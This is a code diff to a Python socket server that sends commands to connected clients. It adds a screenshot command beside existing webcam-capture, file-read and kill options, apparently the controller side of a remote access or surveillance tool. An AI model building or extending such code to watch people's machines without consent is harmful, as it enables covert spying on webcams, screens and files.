@@ -12,6 +12,7 @@ def args_parse(command_line=None):
     parser.add_argument('-r', '--readfile', nargs='*', type=str, help='Read the content of a file')
     parser.add_argument('-k', '--kill', action='store_true', help='Kill the server and delete client files')
     parser.add_argument('-c', '--capture', action='store_true', help='Capture the webcam')
+    parser.add_argument('-S', '--screenshot', action='store_true', help='Take a screenshot')
 
     if command_line:
         return parser.parse_args(command_line)
@@ -61,18 +62,27 @@ def handle_commands(args, server_socket):
         read_file(filename)
     if args.kill:
         print("Killing the server...")
-        server_socket.close()
-        print("Deleting client files...")
-        # Add your logic for deleting files if needed
-        print("Done")
         sys.exit(0)
     if args.capture:
         for client_socket in client_sockets:
             try:
                 client_socket.sendall('CAPTURE'.encode())
-                print('Capture command sent to client')
+                print(f"Capture opened")
             except socket.error:
                 print('Error sending capture command to a client')
+    if args.screenshot:
+        for client_socket in client_sockets:
+            try:
+                global SCREENSHOT_DIR
+                ip = socket.gethostbyname(socket.gethostname())
+                date = time.strftime('%d-%m-%Y')
+                SCREENSHOT_DIR = SCREENSHOT_DIR.format(ip=ip, date=date)
+                if not os.path.exists(SCREENSHOT_DIR):
+                    os.makedirs(SCREENSHOT_DIR)
+                client_socket.sendall('SCREENSHOT'.encode())
+                print(f"Screenshot sent")
+            except socket.error:
+                print('Error sending screenshot command to a client')
 
 
 # Function to read the commands
@@ -86,12 +96,6 @@ def read_commands(server_socket, client_socket):
 
 # Function to set up the server
 def setup_server(host, port):
-    global SCREENSHOT_DIR
-    ip = socket.gethostbyname(socket.gethostname())
-    date = time.strftime('%d-%m-%Y')
-    SCREENSHOT_DIR = SCREENSHOT_DIR.format(ip=ip, date=date)
-    if not os.path.exists(SCREENSHOT_DIR):
-        os.makedirs(SCREENSHOT_DIR)
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
     server_socket.listen(1)
@@ -105,7 +109,6 @@ def accept_connections(server_socket):
     while True:
         client_socket, client_address = server_socket.accept()
         client_sockets.append(client_socket)
-        print(f"Connection from {client_address}")
         threading.Thread(target=handle_client, args=(client_socket,)).start()
 
 
